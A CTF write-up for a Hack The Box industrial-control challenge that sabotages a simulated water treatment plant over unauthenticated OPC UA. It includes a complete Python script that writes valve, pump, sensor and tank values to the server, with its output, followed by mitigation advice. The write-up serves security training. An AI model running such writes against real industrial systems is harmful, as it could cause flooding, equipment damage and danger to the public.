# Floody - CTF Write-Up

## Challenge Overview

**Challenge Name:** Floody  
**Category:** Industrial Control Systems (ICS) / OPC UA  
**Difficulty:** easy  
**Flag:** `HTB{w4t3r_tr34tm3nt_0v3rfl0w3d}`

**Challenge Description:**
> Task Force Phoenix has found a flaw in Volnaya's water treatment plant, its WaterTreatmentPlant object humming via OPC UA, supplying the government's command center. Sabotage it to flood the complex and disrupt Operation Blackout:
> - Set inlet valve to 100% open
> - Increase pump speed to 1600 RPM
> - Spoof flow sensor to 4 L/s
> - Raise tank water level to 5m

## Initial Reconnaissance

### Target Analysis
This challenge involves connecting to an **OPC UA (Open Platform Communications Unified Architecture)** server and manipulating industrial control system parameters to sabotage a water treatment plant.

**OPC UA** is a widely used protocol in industrial automation and SCADA systems for machine-to-machine communication.

### Required Tools
- Python 3.7+
- `asyncua` Python library for OPC UA client functionality
- Understanding of industrial control systems

## Vulnerability Analysis

### OPC UA Security Issues
The target system has several critical security flaws:
1. **Unauthenticated Access:** OPC UA server allows anonymous connections
2. **Write Permissions:** Critical system parameters can be modified without authorization
3. **No Access Controls:** No restrictions on what values can be written to control nodes
4. **Lack of Network Segmentation:** Industrial system exposed to external networks

### System Architecture Discovery
The water treatment plant contains the following components:
- **Pump:** Controls water flow with adjustable speed (RPM)
- **Valve:** Controls inlet water flow with percentage opening
- **Tank:** Stores water with level monitoring
- **Sensors:** Monitor pressure and flow rate
- **Maintenance:** Contains system logs and status information

## Exploitation Strategy

### Step 1: Environment Setup

Create a Python environment with required dependencies:

```bash
# Create virtual environment
python3 -m venv opcua_env
source opcua_env/bin/activate  # Linux/Mac
# opcua_env\Scripts\activate   # Windows

# Install OPC UA library
pip install asyncua
```

### Step 2: Initial Server Reconnaissance

Explore the OPC UA server structure:

```python
#!/usr/bin/env python3
import asyncio
from asyncua import Client

async def explore_server():
    url = "opc.tcp://94.237.123.14:50504"
    
    client = Client(url=url)
    await client.connect()
    print("Connected to OPC UA server!")
    
    # Get the Objects node (where most data resides)
    objects = client.get_objects_node()
    children = await objects.get_children()
    
    for child in children:
        name = await child.read_browse_name()
        display_name = await child.read_display_name()
        print(f"Found: {name.Name} ({display_name.Text})")
    
    await client.disconnect()

# Run the exploration
asyncio.run(explore_server())
```

**Discovery Results:**
```
Connected to OPC UA server!
Found: Server (Server)
Found: WaterTreatmentPlant (WaterTreatmentPlant)
```

### Step 3: Water Treatment Plant Structure Analysis

Explore the WaterTreatmentPlant components:

```python
async def explore_plant():
    url = "opc.tcp://94.237.123.14:50504"
    client = Client(url=url)
    await client.connect()
    
    # Navigate to WaterTreatmentPlant
    objects = client.get_objects_node()
    children = await objects.get_children()
    
    plant = None
    for child in children:
        name = await child.read_browse_name()
        if name.Name == "WaterTreatmentPlant":
            plant = child
            break
    
    # Explore plant components
    components = await plant.get_children()
    
    for comp in components:
        comp_name = await comp.read_browse_name()
        print(f"\nComponent: {comp_name.Name}")
        
        # Look at sub-components
        sub_components = await comp.get_children()
        for sub in sub_components:
            sub_name = await sub.read_browse_name()
            sub_display = await sub.read_display_name()
            print(f"  - {sub_name.Name} ({sub_display.Text})")
    
    await client.disconnect()

asyncio.run(explore_plant())
```

**System Structure:**
```
Component: Pump
  - Status (Status)
  - Speed (Speed)

Component: Tank
  - WaterLevel (WaterLevel)
  - Volume (Volume)

Component: Valve
  - Status (Status)
  - PercentOpen (PercentOpen)

Component: Sensors
  - Pressure (Pressure)
  - FlowRate (FlowRate)

Component: Maintenance
  - SecretLog (SecretLog)
```

### Step 4: Target Parameter Identification

Based on the challenge requirements, we need to modify:
1. **Inlet valve to 100% open** → `WaterTreatmentPlant/Valve/PercentOpen` = 100
2. **Pump speed to 1600 RPM** → `WaterTreatmentPlant/Pump/Speed` = 1600  
3. **Flow sensor to 4 L/s** → `WaterTreatmentPlant/Sensors/FlowRate` = 4
4. **Tank water level to 5m** → `WaterTreatmentPlant/Tank/WaterLevel` = 5

### Step 5: Complete Sabotage Implementation

```python
#!/usr/bin/env python3
"""
OPC UA Water Treatment Plant Sabotage Script
"""

import asyncio
from asyncua import Client

async def sabotage_water_plant():
    url = "opc.tcp://94.237.123.14:50504"
    
    try:
        print("🔧 Connecting to OPC UA server...")
        client = Client(url=url)
        await client.connect()
        print("✓ Connected successfully!")
        
        # Navigate to WaterTreatmentPlant
        objects = client.get_objects_node()
        children = await objects.get_children()
        
        plant = None
        for child in children:
            name = await child.read_browse_name()
            if name.Name == "WaterTreatmentPlant":
                plant = child
                break
        
        if not plant:
            print("❌ WaterTreatmentPlant not found")
            return
        
        print("🎯 Found WaterTreatmentPlant, executing sabotage...")
        
        # Get all components
        components = await plant.get_children()
        
        # Find each component
        valve_node = None
        pump_node = None
        sensors_node = None
        tank_node = None
        maintenance_node = None
        
        for comp in components:
            name = await comp.read_browse_name()
            if name.Name == "Valve":
                valve_node = comp
            elif name.Name == "Pump":
                pump_node = comp
            elif name.Name == "Sensors":
                sensors_node = comp
            elif name.Name == "Tank":
                tank_node = comp
            elif name.Name == "Maintenance":
                maintenance_node = comp
        
        success_count = 0
        
        # 1. Set inlet valve to 100% open
        print("\n1. Setting inlet valve to 100% open...")
        if valve_node:
            valve_children = await valve_node.get_children()
            for child in valve_children:
                child_name = await child.read_browse_name()
                if child_name.Name == "PercentOpen":
                    await child.write_value(100.0)
                    current_value = await child.read_value()
                    print(f"✓ Valve set to {current_value}% open")
                    success_count += 1
                    break
        
        # 2. Increase pump speed to 1600 RPM
        print("\n2. Setting pump speed to 1600 RPM...")
        if pump_node:
            pump_children = await pump_node.get_children()
            for child in pump_children:
                child_name = await child.read_browse_name()
                if child_name.Name == "Speed":
                    await child.write_value(1600.0)
                    current_value = await child.read_value()
                    print(f"✓ Pump speed set to {current_value} RPM")
                    success_count += 1
                    break
        
        # 3. Spoof flow sensor to 4 L/s
        print("\n3. Setting flow sensor to 4 L/s...")
        if sensors_node:
            sensor_children = await sensors_node.get_children()
            for child in sensor_children:
                child_name = await child.read_browse_name()
                if child_name.Name == "FlowRate":
                    await child.write_value(4.0)
                    current_value = await child.read_value()
                    print(f"✓ Flow sensor set to {current_value} L/s")
                    success_count += 1
                    break
        
        # 4. Raise tank water level to 5m
        print("\n4. Setting tank water level to 5m...")
        if tank_node:
            tank_children = await tank_node.get_children()
            for child in tank_children:
                child_name = await child.read_browse_name()
                if child_name.Name == "WaterLevel":
                    await child.write_value(5.0)
                    current_value = await child.read_value()
                    print(f"✓ Tank water level set to {current_value}m")
                    success_count += 1
                    break
        
        print(f"\n=== SABOTAGE SUMMARY ===")
        print(f"Successfully modified {success_count}/4 parameters")
        
        if success_count == 4:
            print("🎯 ALL SABOTAGE TARGETS ACHIEVED!")
            print("🌊 FLOODING INITIATED!")
            
            # Check for the flag in SecretLog
            print("\n🔍 Checking for system response...")
            if maintenance_node:
                print("🔧 Found Maintenance node, checking contents...")
                maint_children = await maintenance_node.get_children()
                for child in maint_children:
                    child_name = await child.read_browse_name()
                    if child_name.Name == "SecretLog":
                        try:
                            secret_value = await child.read_value()
                            print(f"🏆 FLAG FOUND: {secret_value}")
                        except Exception as e:
                            print(f"Could not read SecretLog: {e}")
        
        await client.disconnect()
        print("\n🔌 Disconnected from OPC UA server")
        
    except Exception as e:
        print(f"❌ Critical error: {e}")

# Run the sabotage
asyncio.run(sabotage_water_plant())
```

### Step 6: Execute the Attack

Save the script and execute:

```bash
python sabotage.py
```

**Expected Output:**
```
🔧 Connecting to OPC UA server...
✓ Connected successfully!
🎯 Found WaterTreatmentPlant, executing sabotage...

1. Setting inlet valve to 100% open...
✓ Valve set to 100.0% open

2. Setting pump speed to 1600 RPM...
✓ Pump speed set to 1600.0 RPM

3. Setting flow sensor to 4 L/s...
✓ Flow sensor set to 4.0 L/s

4. Setting tank water level to 5m...
✓ Tank water level set to 5.0m

=== SABOTAGE SUMMARY ===
Successfully modified 4/4 parameters
🎯 ALL SABOTAGE TARGETS ACHIEVED!
🌊 FLOODING INITIATED!

🔍 Checking for system response...
🔧 Found Maintenance node, checking contents...
🏆 FLAG FOUND: HTB{w4t3r_tr34tm3nt_0v3rfl0w3d}
```

## Attack Chain Summary

```
1. OPC UA Reconnaissance → 2. System Structure Discovery → 3. Parameter Identification → 4. Value Manipulation → 5. Sabotage Execution → 6. Flag Extraction
```

## Key Technical Concepts

1. **OPC UA Protocol:** Machine-to-machine communication protocol for industrial automation
2. **SCADA Security:** Industrial control system vulnerabilities and attack vectors
3. **Industrial Sabotage:** Manipulating critical infrastructure parameters
4. **Python Async Programming:** Asynchronous operations for network communication
5. **Node Navigation:** Browsing OPC UA server object hierarchies

## Security Implications

### Real-World Impact
This type of attack demonstrates how compromised industrial control systems can:
- **Cause Physical Damage:** Flooding, equipment failure, safety hazards
- **Disrupt Operations:** Shutdown of critical infrastructure
- **Environmental Impact:** Water contamination, resource waste
- **Economic Losses:** Equipment damage, downtime costs

### Common ICS Vulnerabilities
1. **Lack of Authentication:** Anonymous access to critical systems
2. **Insecure Protocols:** Unencrypted industrial protocols
3. **Network Exposure:** Direct internet connectivity
4. **Inadequate Monitoring:** No detection of parameter changes
5. **Legacy Systems:** Outdated software with known vulnerabilities

## Mitigation Recommendations

### For Industrial Systems
1. **Network Segmentation:** Isolate industrial networks from corporate/internet networks
2. **Authentication:** Implement strong authentication for OPC UA connections
3. **Access Controls:** Role-based access control for system parameters
4. **Monitoring:** Real-time monitoring of parameter changes and anomalies
5. **Encryption:** Use OPC UA security modes with encryption

### Example Secure Configuration
```python
# Secure OPC UA client configuration
from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
from asyncua.ua import MessageSecurityMode

client = Client(url, timeout=60)
client.set_security(
    SecurityPolicyBasic256Sha256,
    certificate_path,
    private_key_path,
    server_certificate_path,
    MessageSecurityMode.SignAndEncrypt
)
client.set_user_password("username", "password")
```

## Tools and Techniques Used

- **asyncua Library:** Python OPC UA client for industrial system communication
- **Python Async Programming:** Handling asynchronous network operations
- **Industrial Protocol Analysis:** Understanding OPC UA node structures
- **System Reconnaissance:** Exploring industrial system architectures

## Write-Up Credit: [binchickens69](https://ctf.hackthebox.com/user/profile/605069)